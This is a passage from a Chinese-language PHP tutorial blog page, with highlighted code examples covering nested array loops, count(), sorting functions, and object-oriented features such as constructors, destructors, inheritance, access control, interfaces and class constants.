class="string">&#x27;hubei&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;河北&#x27;</span> =&gt; <span class="string">&#x27;hebei&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;山东&#x27;</span> =&gt; <span class="string">&#x27;shandong&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;山西&#x27;</span> =&gt; <span class="string">&#x27;sanxi&#x27;</span>,</span><br><span class="line">       ),</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//注：我们在使用foreach循环时，第一次循环将键为0和键为1的两个数组赋值给一个变量($value)。然后，</span></span><br><span class="line"><span class="comment">//再套一个循环遍历这个$value变量，$value中的值取出来，赋值给$k和$v。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $value)&#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//第一次循环把国家的数组赋值给了$value</span></span><br><span class="line">   <span class="comment">//第二次循环把中国的省份的数组又赋值给了$value</span></span><br><span class="line">   <span class="comment">//因此，我在循环的时候把$value再遍历一次</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">foreach</span>($value <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">           <span class="keyword">echo</span> $k . <span class="string">&#x27;-----&#x27;</span> . $v .<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//为了看的更清晰，我在中间加上华丽丽的分割线方便你来分析</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;----------分割线-----------&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>总结：</strong></p>
</blockquote>
<ol>
<li>第一次循环的时候，将数组赋值给了$value，然后用foreach循环$value。将二维的子数组中的键给到$k，值赋值给变量$v。</li>
<li>第一次循环退出子数组的循环，执行后续代码显示分割线。</li>
<li>依此类推，第二次循环也是这样。</li>
</ol>
<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. 统计数组元素个数</strong></font><br>数组是我们最常用到的类型，那如何计算某个一维数组的个数呢。其实我们可以用到我们之前学过的数学函数里面的一个：<font color="#00B2EE"><strong>count()</strong></font>。<br><font color="#FF7F00">count($变量)</font> 函数用于返回数组的长度（元素数）：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$name</span>=Array(<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;andy&#x27;</span>,<span class="string">&#x27;jack&#x27;</span>);</span><br><span class="line"><span class="built_in">echo</span> count(<span class="variable">$name</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>6. PHP 数组排序</strong></font><br>数组中的元素可以按字母或数字顺序进行降序或升序排列。<br>升序：从小到大的顺序进行排序，如果是英文单词，那么按字母A-Za-z的顺序排序，如果是数字，那么按数字的大小进行排序。<br>降序：与升序相反</p>
<p>   sort() - 对数组进行升序排列<br>   rsort() - 对数组进行降序排列<br>   asort() - 根据关联数组的值，对数组进行升序排列<br>   ksort() - 根据关联数组的键，对数组进行升序排列<br>   arsort() - 根据关联数组的值，对数组进行降序排列<br>   krsort() - 根据关联数组的键，对数组进行降序排列<br></font></p>
<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>7. 数组函数</strong></font><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_ref_array.asp">PHP 数组函数</a>]</font></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-7-PHP-命名空间"><a href="#1-7-PHP-命名空间" class="headerlink" title="1.7 PHP 命名空间"></a><font color="#3CB371" face="Comic sans MS">1.7 PHP 命名空间</font></h4><p><font face="Comic sans MS"><font color="red"><strong>[<a href="https://directoree.github.io/post/PHP-namespace">参见本站博客：PHP-命名空间</a>]</strong></font><br></font></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-8-PHP-面向对象"><a href="#1-8-PHP-面向对象" class="headerlink" title="1.8 PHP 面向对象"></a><font color="#3CB371" face="Comic sans MS">1.8 PHP 面向对象</font></h4><ul>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>类：</strong></font>  定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>对象：</strong></font>  是类的实例。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>成员变量：</strong></font>  定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>成员函数：</strong></font>  定义在类的内部，可用于访问对象的数据。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>继承：</strong></font>  继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>父类：</strong></font>  一个类被其他类继承，可将该类称为父类，或基类，或超类。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>子类：</strong></font>  一个类继承其他类称为子类，也可称为派生类。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>多态：</strong></font>  多态性是指相同的操作或函数、过程可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>重载：</strong></font>  简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>抽象性：</strong></font>  抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>封装：</strong></font> 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>构造函数：</strong></font>  主要用来在创建对象时初始化对象，即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>析构函数：</strong></font>  析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</font></li>
</ul>
<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>1. 构造函数</strong></font><br>构造函数 ，是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。<br> PHP 5 允行开发者在一个类中定义一个方法作为构造函数，语法格式如下：<br><font color="#00B2EE"> void  __construct ([ mixed $args [, $… ]] )</font><br> 在上面的例子中我们就可以通过构造方法来初始化 $url 和 $title 变量：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"> $par1, $par2 </span>) </span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;url = $par1;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;title = $par2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    <span class="comment">//设置编码</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">     <span class="comment">/* 成员变量 */</span></span><br><span class="line">     <span class="keyword">var</span> $url;</span><br><span class="line">     <span class="keyword">var</span> $title;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">/* 成员函数 */</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params">$par</span>)</span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;url = $par;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params">$par</span>)</span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;title = $par;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"> $par1, $par2 </span>) </span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;url = $par1;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;title = $par2;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用成员函数，设置标题和URL</span></span><br><span class="line"> $php = <span class="keyword">new</span> Site(<span class="string">&#x27;www.php.cn&#x27;</span>, <span class="string">&#x27;php中文网&#x27;</span>);</span><br><span class="line"> $taobao = <span class="keyword">new</span> Site(<span class="string">&#x27;www.taobao.com&#x27;</span>, <span class="string">&#x27;淘宝&#x27;</span>);</span><br><span class="line"> $google = <span class="keyword">new</span> Site(<span class="string">&#x27;www.google.com&#x27;</span>, <span class="string">&#x27;Google 搜索&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用成员函数，获取标题和URL</span></span><br><span class="line"> $php-&gt;getTitle();</span><br><span class="line"> $taobao-&gt;getTitle();</span><br><span class="line"> $google-&gt;getTitle();</span><br><span class="line"> </span><br><span class="line"> $php-&gt;getUrl();</span><br><span class="line"> $taobao-&gt;getUrl();</span><br><span class="line"> $google-&gt;getUrl();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. 析构函数</strong></font><br>析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    <span class="comment">//设置编码</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyDestructableClass</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;构造函数\n&quot;</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;MyDestructableClass&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;销毁 &quot;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> $obj = <span class="keyword">new</span> MyDestructableClass();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    <span class="comment">//设置编码</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyDestructableClass</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;构造函数\n&quot;</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;MyDestructableClass&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;销毁 &quot;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> $obj = <span class="keyword">new</span> MyDestructableClass();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. 继承</strong></font><br>PHP 使用关键字 extends 来继承一个类，PHP 不支持多继承，格式如下：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 代码部分</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 子类扩展站点类别</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child_Site</span> <span class="keyword">extends</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $category;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setCate</span>(<span class="params">$par</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;category = $par;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getCate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;category . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>4. 方法重写</strong></font><br>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。<br>下面的例中重写了 getUrl 与 getTitle 方法：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url . PHP_EOL;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . PHP_EOL;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;title;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. 访问控制</strong></font><br>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。<br><font color="#00B2EE"><strong>public（公有）：</strong></font>公有的类成员可以在任何地方被访问。<br><font color="#00B2EE"><strong>protected（受保护）：</strong></font>受保护的类成员则可以被其自身以及其子类和父类访问。<br><font color="#00B2EE"><strong>private（私有）：</strong></font>私有的类成员则只能被其定义所在的类访问。</p>
<p><font color="red"><strong>(1) 属性的访问控制</strong></font><br>类属性必须定义为公有，受保护，私有之一。如果用 var 定义，则被视为公有。<br></font></p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Define MyClass</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> $public = <span class="string">&#x27;Public&#x27;</span>;</span><br><span class="line">     <span class="keyword">protected</span> $protected = <span class="string">&#x27;Protected&#x27;</span>;</span><br><span class="line">     <span class="keyword">private</span> $private = <span class="string">&#x27;Private&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">printHello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> $obj = <span class="keyword">new</span> MyClass();</span><br><span class="line"> <span class="keyword">echo</span> $obj-&gt;public; <span class="comment">// 这行能被正常执行</span></span><br><span class="line"> <span class="keyword">echo</span> $obj-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"> <span class="keyword">echo</span> $obj-&gt;private; <span class="comment">// 这行也会产生一个致命错误</span></span><br><span class="line"> $obj-&gt;printHello(); <span class="comment">// 输出 Public、Protected 和 Private</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Define MyClass2</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="comment">// 可以对 public 和 protected 进行重定义，但 private 而不能</span></span><br><span class="line">     <span class="keyword">protected</span> $protected = <span class="string">&#x27;Protected2&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">printHello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> $obj2 = <span class="keyword">new</span> MyClass2();</span><br><span class="line"> <span class="keyword">echo</span> $obj2-&gt;public; <span class="comment">// 这行能被正常执行</span></span><br><span class="line"> <span class="keyword">echo</span> $obj2-&gt;private; <span class="comment">// 未定义 private</span></span><br><span class="line"> <span class="keyword">echo</span> $obj2-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"> $obj2-&gt;printHello(); <span class="comment">// 输出 Public、Protected2 和 Undefined</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>(2) 方法的访问控制</strong></font><br>类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。<br></font></p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Define MyClass</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="comment">// 声明一个公有的构造函数</span></span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 声明一个公有的方法</span></span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPublic</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 声明一个受保护的方法</span></span><br><span class="line">     <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">MyProtected</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 声明一个私有的方法</span></span><br><span class="line">     <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPrivate</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 此方法为公有</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyPrivate();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> $myclass = <span class="keyword">new</span> MyClass;</span><br><span class="line"> $myclass-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span><br><span class="line"> $myclass-&gt;MyProtected(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"> $myclass-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"> $myclass-&gt;Foo(); <span class="comment">// 公有，受保护，私有都可以执行</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Define MyClass2</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="comment">// 此方法为公有</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">Foo2</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> $myclass2 = <span class="keyword">new</span> MyClass2;</span><br><span class="line"> $myclass2-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span><br><span class="line"> $myclass2-&gt;Foo2(); <span class="comment">// 公有的和受保护的都可执行，但私有的不行</span></span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Bar</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;testPrivate();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;testPublic();</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Bar::testPublic\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Bar::testPrivate\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">extends</span> <span class="title">Bar</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Foo::testPublic\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Foo::testPrivate\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> $myFoo = <span class="keyword">new</span> foo();</span><br><span class="line"> $myFoo-&gt;test(); <span class="comment">// Bar::testPrivate</span></span><br><span class="line"> <span class="comment">// Foo::testPublic</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>6. 接口</strong></font><br>使用<font color="#00B2EE"><strong>接口（interface）</strong></font>，可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。<br>接口是通过 interface关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。<br>接口中定义的所有方法都必须是公有，这是接口的特性。<br>要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。<br></font> </p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 声明一个&#x27;iTemplate&#x27;接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">iTemplate</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setVariable</span>(<span class="params">$name, $var</span>)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtml</span>(<span class="params">$template</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 实现接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> <span class="keyword">implements</span> <span class="title">iTemplate</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $vars = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setVariable</span>(<span class="params">$name, $var</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vars[$name] = $var;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtml</span>(<span class="params">$template</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;vars <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line">            $template = str_replace(<span class="string">&#x27;&#123;&#x27;</span> . $name . <span class="string">&#x27;&#125;&#x27;</span>, $value, $template);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $template;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>7. 常量</strong></font><br>可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用<font color="#FF7F00"> $ </font>符号。<br>常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。<br>自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字（如 self，parent 或 static）。<br></font> </p>
<p>示例代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> class MyClass</span><br><span class="line"> &#123;</span><br><span class="line">     const constant = <span class="string">&#x27;常量值&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">function</span> <span class="function"><span class="title">showConstant</span></span>() &#123;</span><br><span class="line">         <span class="built_in">echo</span>  self::constant . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> MyClass::constant . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$classname</span> = <span class="string">&quot;MyClass&quot;</span>;</span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$classname</span>::constant . <span 